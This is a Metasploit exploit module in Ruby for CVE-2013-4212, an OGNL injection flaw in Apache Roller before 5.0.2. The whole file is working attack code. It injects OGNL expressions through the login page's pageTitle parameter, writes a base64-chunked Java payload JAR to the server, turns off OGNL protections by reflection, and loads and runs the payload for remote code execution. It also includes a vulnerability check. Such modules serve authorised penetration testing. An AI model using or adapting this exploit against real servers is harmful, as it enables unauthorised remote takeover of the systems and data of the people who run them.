##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Roller OGNL Injection',
      'Description'    => %q{
        This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The
        vulnerability is due to an OGNL injection on the UIAction controller because of an
        insecure usage of the ActionSupport.getText method. This module has been tested
        successfully on Apache Roller 5.0.1 on Ubuntu 10.04.
      },
      'Author'         =>
        [
          'Unknown', # From coverity.com / Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-4212'],
          [ 'URL', 
'http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html']
        ],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'Privileged'     => true,
      'Targets'        =>
        [
          [ 'Apache Roller 5.0.1', { } ]
        ],
      'DisclosureDate' => 'Oct 31 2013',
      'DefaultTarget' => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'The path to the Apache Roller application.', "/roller"])
        ], self.class)
  end

  def execute_command(cmd)
    injection = "%24{(%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue,CMD,'')}"
    injection.gsub!(/CMD/, Rex::Text::uri_encode(cmd))

    vprint_status("Attempting to execute: #{cmd}")

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path.to_s, "roller-ui", "login.rol"),
      'encode_params' => false,
      'vars_get' =>
      {
        'pageTitle' => injection
      }
    })
  end

  def java_upload_part(part, filename, append = 'false')
    cmd = "#f=new java.io.FileOutputStream('#{filename}'+#a,#{append}),"
    cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),"
    cmd << "#f.close(),#a='#{@random_suffix}'"
    execute_command(cmd)
  end

  def exploit

    print_status("Checking injection...")

    if check == Exploit::CheckCode::Vulnerable
      print_good("Target looks vulnerable, exploiting...")
    else
      print_warning("Target not found as vulnerable, trying anyway...")
    end

    @random_suffix = rand_text_alphanumeric(3) # To avoid duplicate execution
    @payload_exe = rand_text_alphanumeric(4+rand(4)) + ".jar"
    append = 'false'
    jar = payload.encoded_jar.pack

    File.open("/tmp/#{@payload_exe}", "wb") do |f| f.write(jar) end

    chunk_length = 384 # 512 bytes when base64 encoded

    parts = jar.chars.each_slice(chunk_length).map(&:join)
    parts.each do |part|
      java_upload_part(part, @payload_exe, append)
      append = 'true'
    end

    register_files_for_cleanup("#{@payload_exe}null", "#{@payload_exe}#{@random_suffix}")

    cmd = ""
    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1
    cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),"
    cmd << "#q.setAccessible(true),#q.set(null,true),"
    cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),"
    cmd << "#q.setAccessible(true),#q.set(null,false),"
    # create classloader
    cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new 
java.io.File('#{@payload_exe}'+#a).toURI().toURL()}),#a='#{rand_text_alphanumeric(4)}',"
    # load class
    cmd << "#c=#cl.loadClass('metasploit.Payload'),"
    # invoke main method
    cmd << "#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke("
    cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    execute_command(cmd)
  end

  def check
    addend_one = rand_text_numeric(rand(3) + 1).to_i
    addend_two = rand_text_numeric(rand(3) + 1).to_i
    sum = addend_one + addend_two

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path.to_s, "roller-ui", "login.rol"),
      'vars_get' =>
        {
          'pageTitle' => "${new java.lang.Integer(#{addend_one}+#{addend_two})}",
        }
    })

    if res and res.code == 200 and res.body =~ /#{sum}/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

end

